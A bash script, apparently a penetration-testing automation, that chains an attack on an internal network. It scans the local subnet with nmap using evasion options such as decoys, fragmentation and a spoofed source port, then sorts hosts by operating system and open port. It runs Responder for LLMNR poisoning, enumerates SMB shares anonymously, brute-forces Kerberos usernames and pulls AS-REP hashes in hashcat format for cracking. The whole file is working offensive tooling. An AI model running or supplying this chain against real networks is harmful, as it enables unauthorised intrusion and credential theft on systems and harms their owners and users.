#!/bin/bash
# Main Script to be executed by initial_script.sh
# Author: Prakshit V Jain

set -e

# find the subnet
SUBNET=$(ip route | grep eth | grep -v default | awk '{print $1}')

# perform host scan using nmap
nmap -sn "$SUBNET" -T3 -oA host_scan
grep "scan report" host_scan.gnmap | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' > hosts.txt

# use for loop to perform individual service scan on all hosts 
i=1
for IP in $(cat hosts.txt); do
  sudo nmap "$IP" -Pn -sS -sV -v -sC -p- -T3 --max-retries 3 -D RND:10 -f -g 53 -oA "service_scan${i}"
  ((i++))
done

# group IPs as type of systems
grep -E 'IIS|microsoft-ds|netbios-ssn|msrpc|epmap|Kerberos-Sec|MSWin|Windows|Exchange|SharePoint|MSFT' service_scan*.gnmap | awk '{print $2}' | sort -u > WIN_HOSTS.txt
grep -E 'sshd|Apache|nginx|ProFTPD|vsFTPd|Postfix|Exim|BIND|lighttpd|Ubuntu|Debian|CentOS' service_scan*.gnmap | awk '{print $2}' | sort -u > LIN_HOSTS.txt

# for loop to group using ports
PORTS="21 22 23 25 53 80 88 110 135 139 143 443 445 1433 3306 3389 5000 5432 5985 5986 6379 8080 8500 9200 9300 11211 27017 47001"

for OS in LIN WIN; do
  INPUT_FILE="${OS}_HOSTS.txt"

  for PORT in $PORTS; do
    grep -f "$INPUT_FILE" service_scan*.gnmap | grep -E "${PORT}/open/tcp" | awk '{print $2}' | sort -u > ${OS}_PORT${PORT}.txt
  done
done

# LLMNR Poisoning
responder -I eth0 > responder.txt &

# SMB Enum 
for IP in $(cat WIN_PORT445.txt); do
  smbclient -L "$IP" -N > smb-${IP}.txt
done

# Kerberoasting AS-REP 
i=1
for IP in $(cat WIN_PORT88.txt); do
  DOMAIN=$(nmap $IP -p389 --script=ldap-rootdse | grep "defaultNamingContext" | cut -d"=" -f2 | sed 's/,DC=/./g')
  
  # a large userlist.txt that contains possible username 
  ./kerbrute userenum -d "$DOMAIN" --dc "$IP" userlist.txt > valid_users.txt
  
  python3 -m impacket.GetNPUsers "$DOMAIN/" -usersfile valid_users.txt -dc-ip "$IP" -no-pass -format hashcat -outputfile "asrep_hashes{$i}.txt" 
  ((i++))
done


